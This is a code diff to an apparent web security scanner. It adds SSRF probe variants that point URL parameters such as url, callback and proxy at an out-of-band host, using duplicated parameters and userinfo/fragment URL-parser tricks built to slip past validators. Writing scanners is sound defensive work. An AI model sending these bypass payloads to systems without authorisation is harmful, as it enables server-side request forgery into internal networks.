@@ -1926,6 +1926,14 @@ class SSRFOOBProbe(DeepScanProbe):
         "webhook", "next", "return_to", "continue", "uri", "src",
         "preview", "thumbnail", "avatar",
     )
+    # Subset of SSRF_PARAMS that get HPP / URL-parser-confusion variants
+    # in addition to the plain OOB payload. URL-handling-class params
+    # only — testing param-duplication on a non-URL param like `next`
+    # is rarely productive vs. cost.
+    HPP_PARAMS = frozenset({
+        "url", "callback", "redirect_uri", "target", "proxy", "fetch",
+        "source", "dest", "uri",
+    })
 
     def __init__(self, *args, **kwargs):
         super().__init__(*args, **kwargs)
@@ -2042,6 +2050,54 @@ class SSRFOOBProbe(DeepScanProbe):
                                        "canary": self.pivot_canary,
                                        "mode": self.mode},
                             ))
+
+                # HPP + URL-parser-confusion variants. Many validators
+                # check the FIRST or LAST occurrence of a duplicated param,
+                # while the back-end uses the opposite. Same for URLs with
+                # ambiguous fragment/userinfo/credentials boundaries —
+                # the validator parses one way, the fetcher another.
+                #
+                # Restricted to the highest-yield URL-handling params to
+                # keep per-base request count manageable. Validator-bypass
+                # classes apply uniformly across param names; testing
+                # `url` exhaustively is roughly as informative as testing
+                # all 21 params.
+                if param in self.HPP_PARAMS:
+                    oob_url = f"http://{self.oob_host}/{param}-hpp-{hash(base) & 0xffff:x}"
+                    safe_self = base.rstrip("/")
+                    hpp_variants = [
+                        # Param-duplication (HPP) — validator sees one, fetcher uses other
+                        (f"{safe_self}/?{urlencode({param: safe_self})}&{urlencode({param: oob_url})}",
+                         "hpp-last-wins"),
+                        # URL-parser confusion — validator splits differently than fetcher
+                        (f"{safe_self}/?{urlencode({param: f'http://{urlparse(base).netloc}@{self.oob_host}/'})}",
+                         "url-parser-userinfo"),
+                        (f"{safe_self}/?{urlencode({param: f'http://{self.oob_host}#@{urlparse(base).netloc}/'})}",
+                         "url-parser-fragment"),
+                    ]
+                    for variant_url, variant_kind in hpp_variants:
+                        vr = await jittered_get(variant_url)
+                        if vr is None:
+                            continue
+                        results.append(DeepScanFinding(
+                            url=variant_url, probe=self.name,
+                            signal=f"ssrf-oob-{variant_kind}",
+                            severity="high",
+                            title=f"SSRF OOB payload sent via {variant_kind} on ?{param}= at {base}",
+                            evidence=(
+                                f"Variant: {variant_kind}\nParam: {param}\n"
+                                f"OOB host: {self.oob_host}\n"
+                                f"Response status: {vr.status_code}\n"
+                                f"Each variant tests a different validator/fetcher "
+                                f"split. Confirm via OOB listener; the inbound "
+                                f"hostname includes '-hpp-' so you can identify "
+                                f"which validator-bypass class triggered."
+                            ),
+                            extra={"param": param, "variant": variant_kind,
+                                   "oob-host": self.oob_host,
+                                   "response-status": vr.status_code,
+                                   "mode": self.mode},
+                        ))
             return results
 
         if self.mode == "heuristic":
